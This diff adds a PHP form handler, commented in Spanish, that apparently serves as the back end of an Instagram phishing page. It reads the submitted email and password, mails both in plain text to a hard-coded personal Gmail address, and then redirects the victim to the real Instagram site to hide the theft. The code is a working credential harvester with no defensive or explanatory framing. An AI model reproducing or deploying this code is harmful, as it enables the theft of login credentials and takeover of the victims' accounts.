@@ -1,0 +1,26 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Obtener datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Dirección de correo a la que se enviará la información
+    $recipientEmail = "laureanoemmanuel17@gmail.com";
+
+    // Crear el contenido del correo
+    $subject = "Información de inicio de sesión";
+    $message = "Correo electrónico: " . $email . "\nContraseña: " . $password;
+    $headers = "From: no-reply@example.com";
+
+    // Enviar el correo
+    if (mail($recipientEmail, $subject, $message, $headers)) {
+        // Redirigir a la página oficial de Instagram
+        header("Location: https://www.instagram.com/");
+        exit();
+    } else {
+        echo "Error al enviar el correo.";
+    }
+} else {
+    echo "Método de solicitud no permitido.";
+}
+?>
